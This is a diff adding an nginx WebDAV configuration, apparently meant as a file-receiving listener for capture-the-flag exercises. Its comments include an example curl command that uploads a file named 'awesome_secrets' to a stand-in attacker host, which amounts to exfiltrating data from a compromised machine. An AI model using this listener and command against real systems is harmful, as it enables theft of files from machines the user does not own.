@@ -1,0 +1,55 @@
+# This is an nginx config that we can run on our local machine
+# to receive files from boxes when we are doing CTFs.
+# It has been tested on Kali Linux Rolling
+# WebDAV is not built into nginx by default, so you may have to
+# build a custom copy with the --with-http_dav_module configuration
+# parameter (./configure --with-http_dav_module)
+# The nginx that ships with Kali has this module built in.
+#
+# It uses WebDAV to receive files
+# The idea came from ippsec's hackthebox videos
+#
+# Put this file in /etc/nginx/sites-available and link it to sites-enabled
+# ln -s /etc/nginx/sites-available/nginx_file_listener /etc/nginx/sites-enabled
+#
+# Restart nginx
+# systemctl restart nginx
+#
+# To use it, use curl (which is installed by default on a lot of systems) like so:
+# curl --upload-file <file_name> http://<server_IP>/<path>
+# 
+# For example:
+# curl --upload-file awesome_secrets http://attacker.box/secretfiles
+#
+# This will upload the file awesome_secrets to
+# /var/www/uploads/secretfiles/awesome_secrets on our box.
+server {
+    # Listen IPv4
+    listen 8001 default_server;
+
+    # Listen IPv6
+    listen [::]:8001 default_server;
+
+    server_name listener;
+
+    location / {
+        # Set the root as /var/www/uploads
+        # Make sure this directory exists and is writable by nginx
+        # On kali, nginx runs as www-data, so after creating the directory,
+        # we have to chown www-data:www-data /var/www/uploads
+        root /var/www/uploads;
+
+        # Allow PUTing of files
+        dav_methods PUT;
+
+        # Allow intermediate directories to be created.
+        create_full_put_path on;
+
+        # You can limit IP ranges allowed to PUT using the following stanza:
+        # limit_except PUT {
+        #     allow <IP range>;
+        #     deny all;
+        # }
+    }
+}
+
